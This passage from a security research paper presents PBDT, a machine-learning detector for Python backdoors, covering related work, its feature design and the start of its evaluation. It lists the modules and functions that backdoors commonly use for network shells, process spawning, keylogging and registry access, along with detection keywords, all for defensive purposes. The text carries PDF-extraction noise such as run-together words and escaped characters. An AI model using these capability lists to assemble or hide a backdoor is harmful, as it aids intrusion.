the more typical papers\\nare summarized in Table 1.\\n2.2.1. Static Detection. Static detection mainly identi\\ufb01es\\nmalicious code by analyzing the grammatical structure and\\nstatisticalcharacteristicsofthesourcecode.'emostclassic\\nmethod is to build a black or white list and detect malicious\\n\\ufb01les through simple string\\u2019s regular matching. NeoPi [16] is\\na classic webshell open-source detection tool. It considers\\nthe document\\u2019s statistical characteristics to determine\\nwhether it is obfuscated and matched some feature function\\nfordetection.However,thefeaturedatabaseisrelativelyold.\\nTu et al. [20] detected webshells in applications based on\\nmalicious signatures and malicious functions. At the same\\ntime, it was proposed to consider only the longest word\\u2019s\\nbeginning and ending with the header tag. 'is method\\nreduced the false positives from NeoPi\\u2019s 24.5% to 6.7%, but\\nits detection essence was still simple character matching.\\nLawrence et al. [2] designed a \\ufb01rewall tool to intercept and\\nalert calls to system functions that were not in the whitelist.\\nHowever, due to the limited whitelist, there were high false\\npositives, and the webshell that was encrypted and obfus-\\ncated by complicated means could not be identi\\ufb01ed.\\nIt is impossible to obtain the function\\u2019s language envi-\\nronment only by manually de\\ufb01ned black and white lists,\\nwhich will cause many false positives. Besides, due to the\\ncontinuous variation of malicious code types, the rule base\\u2019s\\nupdateiscritical, and falsenegatives are inevitable.With the\\nwidespreadapplicationofmachinelearninginvarious\\ufb01elds,\\nit has also been used to detect malicious code, improving\\ndetection accuracy by combining with information such as\\ncode syntax and semantics. AL-Taharwa et al. [21] proposed\\nand implemented a JavaScript obfuscation detector JSOD,\\nwhich focused on obfuscated scripts. It \\ufb01rst performed anti-\\nobfuscation processing and extracted the contextual se-\\nmantic information of the code by using the AST (Abstract\\nSyntax Tree). 'en the malicious JavaScript was detected by\\nthe Bayesian classi\\ufb01er. Fass et al. [17] proposed a pre-de-\\ntection system JStap for malicious JavaScript. Based on\\nexistinglexicalandASTdetection,thesystemaddedthecode\\nCFG(ControlFlowGraph)andPDG(ProgramDependency\\nGraph), fully considering the syntax and semantic infor-\\nmation of the program. Finally, it was classi\\ufb01ed by Random\\nForest. While using machine learning, the e\\ufb00ect of basic\\nfunctions on the maliciousness of the code cannot be\\nignored.\\n'e most common language type in webshell is PHP.\\nOpcodesaretheinstructionsand\\ufb01eldsofthePHPoperation\\nperforming, which can eliminate interference from irrele-\\nvant items. In recent years, it has been often used in PHP\\nwebshell detection. Cui [18] designed a webshell detection\\nmodel, RF-GBDT, which considered the statistical charac-\\nteristics of PHP \\ufb01les. Furthermore, the model extracted the\\nTF-IDF vector and the hash vector of the opcode sequence.\\nAfter integrating all the features, the webshell was recog-\\nnized through Random Forest and gradient boosting deci-\\nsion tree. Fang et al. [22] proposed and implemented the\\nPHP webshell detection system FRF-WD. 'ey innovatively\\nusedtheFastTexttextclassi\\ufb01ertocharacterizePHP\\u2019sopcode\\nsequence, integrating its classi\\ufb01cation results and statistical\\nfeatures as the Random Forest classi\\ufb01er\\u2019s input. In addition\\nto the statistical and opcode features mentioned above, Pan\\netal.\\u2018s[23]detectionmethodofwebshellusedASTtoobtain\\nexecutable data features of PHP code, fully considering the\\nexecution data \\ufb02ow and function parameter characteristics\\nofcommonsystemcommands.'eopcodesequenceshould\\nbecombinedwiththebestn-gramvaluetoe\\ufb00ectivelyensure\\nthe detection e\\ufb00ect.\\nWith the rapid development and application [24, 25] of\\ndeepneuralnetworks,opcodesareoftencombinedtorealize\\nthe webshell detection function. Yong et al. [14] detected\\nPHP webshell based on DNN (deep neural network),\\nextracted opcode features through 2-gram and TF-IDF\\ngrammar models, and input them into a DNN model\\ncomposed of CNN (convolutional neural network), LSTM\\n(long short-term memory), and MLP (multilayer percep-\\ntron) for detection. But the model consumes a lot of\\ncomputing and storage resources. Word vector is a com-\\nmonlyusedrepresentationmethodintextclassi\\ufb01cation,and\\nit has also shown good detection advantages in malicious\\ncode detection in the recent years. Tian et al. [12] detected\\nwebshells with HTTP request packets, used Word2vec to\\nconvert the collected packet text into word vectors, and\\n\\ufb01nally implemented classi\\ufb01cation through the CNN model.\\nNdichu et al. [26] proposed a malicious JavaScript detection\\nscheme, which used the Doc2vec model to characterize the\\nsource code context\\u2019s features and input them into the SVM\\nclassi\\ufb01er to determine the program\\u2019s maliciousness.\\nInsummary,staticdetectioncanuselimitedresourcesto\\nachieve better detection results, but false negatives and false\\npositives are inevitable. How to improve detection accuracy\\nis a problem that needs to be focused on. 'e relevant re-\\nsearch introduced above is aimed at languages such as PHP\\nand JavaScript. Improving the existing methods to make\\nthem suitable for Python malicious code detection is a di-\\nrection worth studying.\\n2.2.2. Dynamic Detection. 'e main idea of dynamic de-\\ntection is to dynamically execute sample \\ufb01les, monitor\\nnetwork tra\\ufb03c, or call sensitive functions to identify mali-\\ncious code. 'is method is often used to analyze speci\\ufb01c\\nSecurity and Communication Networks 3\\n 2037, 2021, 1, Downloaded from https://onlinelibrary.wiley.com/doi/10.1155/2021/9923234 by Morocco Hinari NPL, Wiley Online Library on [25/03/2025]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License\\nbehavior types of \\ufb01les, including extracting HTTP\\nrequesting or responding to payload characteristics, and\\nhooking sensitive functions.\\nKimetal.[27]designedaframeworkcalledJsSandboxto\\ndetect malicious JavaScript. 'rough IFH (internal function\\nhooking) monitoring and analysis of sample code behavior,\\nfunctions that could not be executed by API hooking could\\nbe extracted. 'is method was commonly used in other\\nmaliciouscode classi\\ufb01cationtasksand wouldnot bea\\ufb00ected\\nby operations such as code deformation and obfuscation on\\ndetection performance. Canali et al. [9] used honeypot\\ntechnology to obtain and analyze the attacker\\u2019s behavioral\\ncharacteristics\\u2019 destruction of the target. 'e information\\nsource included HTTP request logs and \\ufb01les modi\\ufb01ed or\\ngenerated after the attacker obtained the victim host\\u2019s\\npermission. It also focused on analyzing common webshell\\nbehaviors. Xie and Hu [10] developed an anomaly detection\\nsystemthatcanidentifywebshells.'eyanalyzedADFA-LD\\nintrusion detection datasets, obtained log behaviors, and\\nused the K-nearest neighbor (KNN) algorithm to cluster\\nthem.Althoughdynamicdetectioncane\\ufb00ectivelyreducethe\\nrate of false positive and false negative, it consumes more\\nresources and it is not suitable for detection tasks with\\nmultiple samples. At the same time, there may be a big gap\\nbetweentheactualapplicationandthedetectione\\ufb00ectinthe\\nideal experimental environment.\\n'erefore, studies have combined static and dynamic\\ndetection to achieve better classi\\ufb01cation results with limited\\nresources. Rieck et al. [28] proposed Cujo, a malicious\\nJavaScript automated detection system, which analyzed by\\ncombining static lexical features and dynamic runtime\\nfeatures. 'e dynamic analysis used sandbox to obtain web\\npagecode,providedanalysisreports,and\\ufb01nallymappedthe\\nreport results to vector space. 'e \\ufb01nal detection model was\\ngenerated based on SVM machine learning. Wang et al. [19]\\nresearched and implemented the JavaScript malware de-\\ntection tool JSDC. First, it used the extracted text, program\\ninformation, and dangerous function call features to detect\\nbased on machine learning. According to attack feature\\nvector and dynamic execution trajectory, malware was di-\\nvided into eight attack types. 'e dynamic and static\\ncombination achieved a false positive rate of 0.2123% and a\\nfalse negative rate of 0.8492%. Starov et al. [3] conducted an\\nin-depth analysis of common webshell behaviors based on\\ntwo dimensions of static analysis and dynamic analysis.\\n'roughstaticanalysis,itwasfoundthatmostofthesample\\nattacks included \\ufb01le browsing and uploading, system in-\\nformationviewing,commandexecution,etc.,whiledynamic\\nanalysisfoundthatmostofthemwouldtrytoaccesslinksor\\ndirectories such as http://\\u2217and /etc/\\u2217.\\nDynamic detection performs better in identifying\\nmalicious code behavior, but its inherent defects have high\\nrequirementsforresourceenvironmentandsamples,andits\\napplication in practice is limited. It is necessary to consider\\nvarious factors to select a suitable detection method\\ncomprehensively.\\n3. Methodology\\n'ePBDTmodelproposedinthispaperisconstructedbased\\non multiple features. Various features can be used for\\nclassi\\ufb01cation alone or in combination. Experimental data\\nwill be used to illustrate the performance of each combi-\\nnation in Section 4.3. 'e architectural designed is shown in\\nFigure 1. It has three categories, including sample module\\nandfunction call features,text statistical features,andopcode\\nfeatures.\\n'e calling feature involves six types of modules and\\nfunctions, including text encryption, network communica-\\ntion, process settings, \\ufb01le operations, command execution,and\\nsystem control,tocapturepotentiallydangerousbehaviorsof\\nthesample.However,thebackdoor\\ufb01lemaybeobfuscatedto\\navoid detection, so text statistical features are added to\\nidentify the obfuscated sample \\ufb01le through typical param-\\neters such asinformation entropy, longest string, coincidence\\nindex, and compression rate. At the same time, this part\\ninvolvestheIP,URL,anddangerouskeywordsthatarelikely\\nto exist in the backdoor. It is impossible to identify the\\nbackdoor based on the above-mentioned manually de\\ufb01ned\\nmalicious behaviors accurately. 'erefore, the opcode-re-\\nlated features are added, including the simple statistical\\nfeatures of the overall text and the suspicious function line,\\nthe TF-IDF feature indicating the importance of words, and\\nthe FastText feature of the e\\ufb03cient text classi\\ufb01er to com-\\nprehensively analyze the meaning of the opcode. Finally,\\nthese features are combined as the feature vector and input\\nT able1: Summary of related work.\\nAuthor Main work Shortcoming\\nStatic\\ndetection\\nScottandHagen\\n[16]\\nIdentifying obfuscated webshells through statistical\\nfeatures\\n'e feature library is old, and using simple\\ncharacter matching with high false positives\\nFass et al. [17] Extracting JavaScript semantic information through\\nAST, CFG, and PDG for malicious judgment\\nNo analysis and consideration of basic\\nfunctions with malicious intent\\nCui et al. [18] Using TF-IDF vectors and hash vectors to obtain\\nwebshell opcode features for detection\\nNo semantic information is considered,\\nwhich may result in false negative\\nYong et al. [14]\\nProcessing opcode through 2-gram and TF-IDF, and\\nusing composite neural network DNN for webshell\\u2019s\\nclassi\\ufb01cation\\nDeep neural network is too complex and\\nconsumes a lot of resources\\nDynamic\\ndetection\\nCanali and\\nBalzarotti [9]\\nAnalysis of common webshell behavior using honeypot\\ntechnology\\nHigh requirements for resources,\\nenvironment, and samples\\nWang et al. [19] Combining attack feature\\u2019s vectors and dynamic\\nexecution trajectories\\n'etypesofmalicious functionssummarized\\nare not comprehensive\\n4 Security and Communication Networks\\n 2037, 2021, 1, Downloaded from https://onlinelibrary.wiley.com/doi/10.1155/2021/9923234 by Morocco Hinari NPL, Wiley Online Library on [25/03/2025]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License\\ninto the Random Forest classi\\ufb01er to classify Python samples\\nand accurately distinguish backdoor \\ufb01les with malicious\\nbehavior.\\nSome of the above features are proposed by previous\\nresearchers and some are proposed in this paper, which we\\nsummarize and illustrate in Table 2. For the old features, the\\nimprovements made in this paper are noted in the third\\ncolumn of the table. In the following, various features and\\nclassi\\ufb01er selection will be introduced in detail.\\n3.1. Call Features. It can be seen from the de\\ufb01nition of\\nbackdoor that the two key points worth noting are\\n\\u201cbypassing security controls\\u201d and \\u201cobtaining system per-\\nmissions.\\u201d 'erefore, there must be speci\\ufb01c modules and\\nfunctionstoimplementcorrespondingfunctions.Wecollect\\nand analyze numerous backdoor samples, combining with\\ndata summary and empirical analysis, and divide the\\nbackdoor\\u2019s common behaviors into the following six cate-\\ngories (Sections 3.3.1\\u20133.1.6). At the same time, we list the\\nmodules and functions required to implement each type of\\nfunction. See Table 3 for details.\\nMost of the function\\u2019s acquisition in the \\ufb01le directly\\nperforms regular matching on the text, such as[16]. 'e\\nshortcomings of this method are obvious. When the cor-\\nresponding function exists in the comment, it will be\\nregarded as called. But in fact, the function has not been\\nexecuted, andof course,there will beno maliciousbehavior.\\n'is paper analyzes the ASTof Python code, extracts the \\ufb01le\\nimport module and call function information, and obtains\\nthe number of various dangerous modules and functions\\nafter counting, as the call features part of the \\ufb01nal\\nclassi\\ufb01cation.\\nAST is a tree-like representation of the abstract gram-\\nmatical structure of a programming language. As the input\\nof the compiler\\u2019s back-end, it does not depend on speci\\ufb01c\\ngrammar and language details and represents information\\non the semantic level of code. Currently, AST has been\\nwidely used in the detection of malicious code\\n[17, 21, 29\\u201333]. 'is method can eliminate the in\\ufb02uence of\\nannotations on text analysis and e\\ufb00ectively extracts infor-\\nmationaboutimportedmodulesandcallingfunctions.Ifitis\\ndetermined to be a suspicious function, recording the\\nnumber of lines in the source \\ufb01le to obtain the line\\u2019s opcode\\ninformation (Section 3.3.1) and \\ufb01nally returns it as a result\\nfor in-depth study and analysis of suspicious \\ufb01le behavior.\\n3.1.1. Text Encryption.'e backdoor uses some obfuscation\\nmethods to bypass the security control and evade the\\nsoftware\\u2019s detection and killing of system. 'e most com-\\nmon one is to use algorithms to encrypt text. In order to\\nachieve this purpose, it is necessary to introduce corre-\\nsponding functional modules and call functions, including\\ncommonly used encryption algorithms \\u201cAES,\\u201d \\u201cRSA,\\u201d\\n\\u201cbase64,\\u201dencryptionpadding\\u201cpadding,\\u201d\\u201cOAEP,\\u201dencoding\\nconversion\\u201cbinascii,\\u201detc.,whichcanbeusedasdetermining\\na feature of the backdoor \\ufb01le.\\n3.1.2. Network Communication. A crucial function in the\\nbackdoor is data interaction, including the communication\\nbetween server and client in the C/S backdoor, and webshell\\nuploading or downloading \\ufb01les from a speci\\ufb01c network\\naddress. Python language implements such functions in-\\ncluding network communication \\u201csocket,\\u201d \\u201csetsockopt,\\u201d\\nSSH connection to remote server \\u201cparamiko,\\u201d \\u201cSSHClient,\\u201d\\nHTTP request \\u201curllib,\\u201d \\u201chttplib,\\u201d etc. If there is such be-\\nhavior, pay attention.\\n3.1.3. Process Setting. Generally, the process needs to be set\\nwhenthebackdoorisrunning,suchasstartinganewprocess\\nto facilitate subsequent operations, including creating a\\nprocess \\u201csubprocess,\\u201d multiprocess management \\u201cmulti-\\nprocessing,\\u201d and generating a pseudo-terminal \\u201cpty.\\u201d\\nConcurrently,toavoiddetectionandobtainpermissions,the\\nprocess may monitor \\u201cselect,\\u201d modify, and obtain the\\nData collection\\nGithub\\nMSF Veil\\nPython\\nBenign\\nBackdoor\\nTraining set\\nBenign\\nBackdoor\\nText processing\\nModule\\nFunction\\nRow\\nAST\\nOpcode\\nText\\nFeature extraction\\nCall features\\n Malicious module feature\\nMalicious function feature \\nLine opcode feature\\nText statistical features \\nInformation entropy\\nLongest string\\nCompression ratio\\nIP/URL\\nIC\\nKeywords\\nOpcode features\\n5-gram + TD-IDF feature\\nFastText malicious judgment\\nfeature\\nModel training and\\nclassi\\ufb01cation\\nRandom forest model\\nBenign Backdoor\\nTesting set\\nFeature set\\nCall features\\nText statistical features \\nOpcode features\\nAll opcode feature\\nTesting set\\nFigure 1: Architecture of PBDT.\\nSecurity and Communication Networks 5\\n 2037, 2021, 1, Downloaded from https://onlinelibrary.wiley.com/doi/10.1155/2021/9923234 by Morocco Hinari NPL, Wiley Online Library on [25/03/2025]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License\\nprocess name \\u201csetproctitle\\u201d, etc. 'e introduction of above\\nmodule has reason to suspect that it has an attacking intent.\\n3.1.4. File Operation.'ebackdoorwillalsoperformaseries\\nof operations on \\ufb01les, including polluting local \\ufb01les, reading\\nand writing system sensitive \\ufb01les, and replacing common\\nsystem command \\ufb01les, in order to achieve the purpose of\\nobtaining system permissions. For example, memory read\\nand write \\u201cStringIO,\\u201d \\ufb01le copy \\u201cshutil,\\u201d \\ufb01le lock \\u201cfcntl,\\u201d and\\n\\u201cexec\\u201dfamilyfunctionsforexecuting\\ufb01les,including\\u201cexecl,\\u201d\\n\\u201cexecv,\\u201d and \\u201cexecvp.\\u201d Although the above modules and\\nfunctions are harmless by themselves, they may cause un-\\ndesirable consequences when used by the backdoor.\\n3.1.5. Command Execution. Executing system commands is\\na common and potentially harmful behavior of backdoors\\nand may be a pivotal step in achieving core functions.\\nSpeci\\ufb01cally, it includes the functions \\u201csystem,\\u201d \\u201ccommand,\\u201d\\n\\u201cexec_command,\\u201detc., that execute commands. In addition,\\ninteractingwiththecommandlineandparsingparametersis\\nalso a signi\\ufb01cant feature, such as modules \\u201cargparse,\\u201d\\n\\u201cgetopt,\\u201d \\u201cargv,\\u201d etc. But normal Python programs may also\\nhave such requirements, so the correct distinction is\\nnecessary.\\n3.1.6. System Control. Controlling the system and\\nobtaining system-related information is the ultimate goal\\nof backdoor execution and an essential manifestation of\\nbackdoor hazards. Such functions include system moni-\\ntoring \\u201cpsutil,\\u201d system hardware\\u2019s informationacquisition\\n\\u201cwmi,\\u201d system operation \\u201cplatform,\\u201d etc. Besides, registry\\noperations \\u201cwinreg\\u201d and virtual memory allocation\\n\\u201cVirtualAlloc\\u201d are also common behaviors. 'is part also\\nincludes some special functions, such as the module\\n\\u201cpynput\\u201dthatcontrolsthekeyboardandmouse.'eabove\\ncan be used as a vital basis for judging whether it is a\\nbackdoor.\\n3.2. Text Statistical Features.'e matching of modules and\\nfunctionscansimplyandintuitivelyidentifysomemalicious\\nbehaviors of the backdoor. However, in actual applications,\\nin order to bypass the security control, the backdoor \\ufb01le is\\nlikely to undergo obfuscation, such as the splicing or\\nencoding of characters, and simple function matching\\ncannotachievethedetectione\\ufb00ect.'eobfuscatedcode text\\nhassometypicalfeatures.Here,fourtypesareselectedasthe\\n\\ufb01nal feature components, and two additional features are\\nadded simultaneously.\\n3.2.1. Information Entropy. 'e concept of information\\nentropy was \\ufb01rst proposed by Shannon [34] in 1948. It\\nrepresentstheprobabilityofrandomdiscreteeventsandis\\na measure of the system order\\u2019s degree. 'e more chaotic\\nthe information, the higher the corresponding entropy.\\n'e method of calculating information entropy is as\\nfollows:\\nT able3: List of common modules and functions of backdoor.\\nModule Function\\nText encryption AES/base64/binascii/hashlib/RSA/\\nCrypto/sha256/hashes/padding/DES\\nb64encode/b64decode/encrypt/decrypt/EncodeAES/DecodeAES/\\nAESGCM/md5/rc4/SHA256/sha1/encode_base64/OAEP/MGF1\\nNetwork\\ncommunication\\nSocket/urllib2/urllib/paramiko/ftplib/\\nSocketServer/httplib Socket/bind/setsockopt/gethostbyname/gethostname/SSHClient\\nProcess setting Subprocess/commands/pty/threading/\\nselect/multiprocessing/setproctitle\\nspawn/Popen/communicate/daemon/fork/'readingTCPServer/\\n'readingUDPServer/setproctitle/Create'read\\nFile operation Shutil/fcntl/StringIO/BytesIO/ctypes/\\nscapy.all Exec/execv/execvp/exec\\ufb01le/storbinary\\nCommand\\nexecution\\nArgparse/getopt/getpass/argv/optparse/\\ncmd\\nSystem/getopt/getoutput/tcsetattr/command/exec_command/\\ncheck_output\\nSystem control Platform/winreg/psutil/wmi/pynput VirtualAlloc/sysinfo\\nT able2: Feature summary.\\nFeature set Old features New features and improvements\\nCall features Malicious module feature\\nMalicious function feature\\nLine opcode feature\\nText statistical features Information entropy\\n'e longest string\\nIndex of coincidence\\nCompression ratio\\nIP/URL information\\nDangerous keywords\\nOpcode features All opcode features\\nTF-IDF feature 5-gram\\nFastText feature 5-gram\\n6 Security and Communication Networks\\n 2037, 2021, 1, Downloaded from https://onlinelibrary.wiley.com/doi/10.1155/2021/9923234 by Morocco Hinari NPL, Wiley Online Library on [25/03/2025]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License\\nH(x) \\ufffd \\u2212 \\udbff\\udf58\\nn\\ni\\ufffd1\\np xi\\u0000 \\udbff\\udf01 log p xi\\u0000 \\udbff\\udf01 \\u0000 \\udbff\\udf01. (1)\\nAmong them, p(xi) represents the probability of a\\nrandom eventxi. When the backdoor performs \\ufb01le obfus-\\ncation to hide its existence, encryption and encoding will\\ngenerate some random strings, making the information\\nentropy higher. 'erefore, the greater the information en-\\ntropy, the more suspicious the corresponding \\ufb01le.\\n3.2.2. 1e Longest String. When the code is obfuscated and\\nencoded,itwillgeneratealongstringwithoutspaces,suchas\\nthe classic base64 encoding. Moreover, the introduction of\\nshellcodewillhavethesamee\\ufb00ect,whichisnoteasytodetect\\nbecauseofthemaliciousbehaviorhiddeninthehexadecimal\\nmachine code. 'is kind of long string is rarely encountered\\nin regular Python code, so the length of the longest string in\\nthe code can be used to determine the backdoor.\\n3.2.3. Index of Coincidence. Index of coincidence represents\\nthe relative frequency of the letters in sample, that is, the\\nprobability that two letters are the same. 'e concept is\\nwidely used in cryptography related research. 'e calcula-\\ntion method is as follows:\\nIC \\ufffd \\udbff\\udf50c\\ni\\ufffd1 ni ni \\u2212 1\\u0000 \\udbff\\udf01\\nN((N \\u2212 1)/c). (2)\\nC isthenormalizationcoe\\ufb03cient,whichis26forEnglish\\nletters, ni is the number of times each letter appears in the\\ntext, andN represents its length. Since the encrypted text\\u2019s\\nrandomness will increase, the code has a high probability of\\nbeing a backdoor \\ufb01le after obfuscation operations such as\\nencryption and encoding if the IC value is low.\\n3.2.4. Compression Ratio. In information theory, data\\ncompression is a process of representing information with\\nfewer data bits than the source \\ufb01le according to a speci\\ufb01c\\nencoding mechanism, which can make the distribution of\\ndata characters tend to be balanced. 'e ratio of after\\ncompressing to before compressing of a \\ufb01le\\u2019s size is called\\nthe compression ratio. In order to achieve the purpose of\\nobfuscation, malicious \\ufb01les generally have a relatively uni-\\nform character\\u2019s distribution after particular encoding, and\\nthe data compression rate is higher than that of ordinary\\n\\ufb01les.Itisreasonabletothinkthat\\ufb01leswithhighcompression\\nrate are backdoors.\\n3.2.5. IP/URL Information. When the backdoor performs\\nnetwork communication, IP or URL is most likely required\\nto indicate the target address, which usually appears in pairs\\nwith data interaction related functions. For example, \\u201cbind\\u201d\\nbinds the IP and port, \\u201chost\\u201d parameter indicates the\\ncommunication host, and \\u201cconnect\\u201d connects to the IP\\naddressandalsoincludesinteractionwithaspeci\\ufb01cnetwork\\naddress URL. 'erefore, the total number of IPs or URLs in\\nthe code can be used as a feature of the backdoor.\\n3.2.6. Dangerous Keywords. When developers write back-\\ndoor code, due to their habits or functional needs, they will\\ninclude some backdoor-related words in comments or\\nnamed functions. 'e characters considered here include\\n\\u201cshellcode,\\u201d \\u201cwebshell,\\u201d \\u201cshell,\\u201d \\u201cbackdoor,\\u201d \\u201ccmd,\\u201d \\u201ccom-\\nmand,\\u201d \\u201chack,\\u201d and \\u201cbypass.\\u201d If there are more dangerous\\nkeywords in the code, it is considered as a suspicious\\nbackdoor \\ufb01le.\\n3.3. Opcode Features. 'e two modules mentioned above\\ncan only identify known malicious behaviors or encoded\\nspecial \\ufb01les. However, there are various types of backdoors\\nin actual applications. People have limited awareness of\\nmalicious codes, and not all malicious \\ufb01les will be encoded.\\n'e text\\u2019s characteristics of some encoded \\ufb01les are not\\nprominent. 'erefore, we consider adding opcode features\\nto express Python code through the nature of instructions\\nandcontextualconnectionsrepresentedbytheopcodeitself.\\nOpcodes represent instructions or \\ufb01elds for performing\\noperationsinacomputerprogram.Itisastepincompilation\\nprocess of Python \\ufb01les. Compared with the source code, it\\ncan eliminate the in\\ufb02uence of \\ufb01le obfuscated and ignore the\\ninterference items such as source comments. 'ere are 121\\nopcodes listed in the latest Python3.8 document. 'is paper\\nobtains the sample\\u2019s opcode sequence and extracts the\\ncorresponding features through the following three types of\\nprocessing.\\n3.3.1. Statistical Features. 'e functions and processing\\nmethods of backdoor \\ufb01les are di\\ufb00erent from benign \\ufb01les, so\\nthe types and numbers of opcodes used may be di\\ufb00erent.\\nFirst, we conduct statistics on each opcode instruction for\\nthe entire text and generate an array with a length of 121 as\\nthe overall opcode statistical feature.\\n'e primary manifestation of the malicious function\\nperformed by the backdoor is malicious functions. If there\\naresuspiciousfunctionsinthebenign\\ufb01le,theopcodesofthe\\ntwo contexts\\u2019 execution parameters may be di\\ufb00erent.\\n'erefore, the backdoor \\ufb01le can be identi\\ufb01ed by the opcode\\ncharacteristics of the suspicious function line. Use the lines\\u2019\\nnumberofthecode\\ufb01le\\u2019sdangerousfunctionwhenobtaining\\nfunction information through AST. 'en, compile all code\\nlines containing dangerous functions into opcodes sepa-\\nrately, and count the total number of various opcodes.\\nSimilarly,anarrayoflength121isgeneratedasthestatistical\\nfeature of the malicious function line\\u2019s opcode.\\n3.3.2. TF-IDF Feature. TF-IDF (term frequency-inverse\\ndocument frequency) is a commonly used weighting tech-\\nnique to evaluate the word\\u2019s importance to the entire text\\n[35]. TF represents the frequency of target word in the text.\\nIDF decreases as the number of texts containing a certain\\nphrase increases. It is used to reduce the impact of some\\ncommon phrases in all texts that have little e\\ufb00ect on the\\nfunction. 'e two are multiplied to the \\ufb01nal TF-IDF value.\\n'e calculation formula is as follows:\\nSecurity and Communication Networks 7\\n 2037, 2021, 1, Downloaded from https://onlinelibrary.wiley.com/doi/10.1155/2021/9923234 by Morocco Hinari NPL, Wiley Online Library on [25/03/2025]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License\\ntfi,j \\ufffd\\nni,j\\n\\udbff\\udf50knk,j\\n,\\nidfi \\ufffd lg |D|\\nj: ti \\u2208dj\\udbff\\udf6e \\udbff\\udf6f\\n\\udbff\\udf0c\\udbff\\udf0c\\udbff\\udf0c\\udbff\\udf0c\\udbff\\udf0c\\n\\udbff\\udf0c\\udbff\\udf0c\\udbff\\udf0c\\udbff\\udf0c\\udbff\\udf0c\\n,\\ntfidfi,j \\ufffd tfi,j \\u00d7 idfi.\\n(3)\\nAmong them,ni,j refers to the number of occurrences of\\nthe word i in \\ufb01le j, and the corresponding denominator\\nrepresents the sum of occurrences of all words in \\ufb01lej. |D|\\nreferstothetotalnumberofsamples,andthecorresponding\\ndenominatorindicatesthenumberofdocumentscontaining\\nthe term i. If the term is not in the document, the de-\\nnominator will be zero. Generally, the denominator will be\\nincreased by one in practical applications. 'e main idea\\napplied here is that if a certain phrase appears more fre-\\nquently in a given sample and rarely appears in other\\nsamples, it is considered that the phrase has a greater class\\ndistinction ability.\\nIn order to obtain the local context information of the\\ntext, on the basis of obtaining the full-text opcode sequence,\\nthen-gramgrammarmodelisused tosegmentthesequence\\nand calculate the frequency. 'e basic idea is to perform a\\nsliding window operation of sizen on the text content in\\nbytestoformasequenceofbytefragmentswithawindowof\\nn. Here, n \\ufffd 5 is used to balance the completeness of the\\ninformation expressed by opcode and the e\\ufb00ect of model\\n(Section 4.3.1). 'e \\ufb01rst 50 subsequences are selected for\\ncalculation since the amount of information and model\\nperformance is comprehensively measured. 'e word se-\\nquence\\u2019s information of the backdoor and benign \\ufb01les may\\nbe di\\ufb00erent, so the TF-IDF value is calculated according to\\nthe n-gram segmentation result. 'e opcode feature matrix\\nindicating the importance of the phrase is obtained to\\nidentify the backdoor.\\n3.3.3. FastText Malicious Judgment Features. FastText is a\\nword vector representation and fast text classi\\ufb01cation tool\\nopen-sourcedbyFacebookin 2016 [36].Itprovides asimple\\nand e\\ufb03cient method for text classi\\ufb01cation and representa-\\ntion learning. It can achieve accuracy comparable to deep\\nlearning methods but is many orders of magnitude faster\\nthanitstrainingspeed.'elengthoftheopcodesequenceof\\ndi\\ufb00erent \\ufb01les may be quite inconsistent. 'e \\ufb01xed-length\\nword vector\\u2019s embedding may miss the text\\u2019s critical in-\\nformation or do much useless work that consumes multiple\\ncomputing resources. Using the FastText model\\u2019s prediction\\nresult as a feature is more suitable for this type of data.\\nFastText has two important optimizations, n-gram and\\nhierarchical softmax. 'e model architecture is shown in\\nFigure 2, wherex1 \\u2212 xN represent the n-gram vector in the\\ntext, and the average value of word vector is used as the\\nfeature to predict the speci\\ufb01ed category. 'e value ofn\\nselected here is the same as the previous module; both are 5.\\nN-gram will keep word order information during model\\ntraining. 'e softmax function is often used as an activation\\nfunction in the neural network\\u2019s output layer to normalize\\nthe output value of the neuron to 0-1 interval. Compared\\nwith the standard softmax, which normalizes all categories\\u2019\\nprobabilities,hierarchicalsoftmaxconstructsaHu\\ufb00mantree\\nbased on the probability of the category, which can reduce\\nthecomplexityfromNtologNandsigni\\ufb01cantlyimprovethe\\ne\\ufb03ciencyofmodel.'elabelcategoryoftestsetpredictedby\\nthe FastText model is used as a feature of the backdoor\\u2019s\\njudgment.\\n3.4. Classi\\ufb01er. After integrating all the above features, they\\nare sent to the classi\\ufb01er for model training and sample\\ndetection. Here, a Random Forest classi\\ufb01er is selected. 'is\\nclassi\\ufb01er was \\ufb01rst proposed by Tin Kam Ho of Bell Labo-\\nratories in 1995 [37] and has been widely used since then.\\nRandom Forest is a classi\\ufb01er containing multiple decision\\ntrees,andthemodeofoutputcategoryofasingletreeisused\\nas the \\ufb01nal output. It uses unbiased estimation. 'e model\\nhas a robust generalization ability, and it is insensitive to\\nmissing or outlier values of features. For unbalanced\\ndatasets, it can reduce errors.\\n'is paper selects several classic machine learning\\nmodels, including XGBoost, Naive Bayes (NB), and Support\\nVector Machine (SVM). Compared with the traditional\\nGBDT algorithm, XGBoost supports column sampling,\\nwhich can not only reduce over\\ufb01tting, but also reduce\\ncalculations. Naive Bayes performs well on small-scale data\\nand has a high speed during training, while SVM has ex-\\ncellent generalization ability. 'e above classi\\ufb01ers perform\\nwell in a variety of code classi\\ufb01cation tasks. We conduct\\nperformance comparisons through experiments (Section\\n4.3.3) and \\ufb01nd that the Random Forest has the best clas-\\nsi\\ufb01cation e\\ufb00ect, so we believe this algorithm is suitable for\\nPython backdoor detection.\\n4. Experimental Evaluation\\n'is section will evaluate the e\\ufb00ect of PBDT and prove its\\nbene\\ufb01ts through comparative experiments. First, we used\\ntool generation and network collection methods to obtain\\nmore than 2,000 Python samples. After deleting some low-\\nquality data, we labeled them. 'en, we built a model, used\\nexisting data to evaluate its performance, and compared the\\ndetection e\\ufb00ects of various modules and common algo-\\nrithms.Finally,wecomparedtheperformanceofPBDTwith\\nsome previous detection methods in similar \\ufb01elds on this\\ndataset. Experiments show that PBDT has a better dis-\\ntinguishing ability for Python backdoors.\\n...\\nhidden\\noutput\\nx1 x2 xN-1 xN\\nFigure 2: FastText model architecture.\\n8 Security and Communication 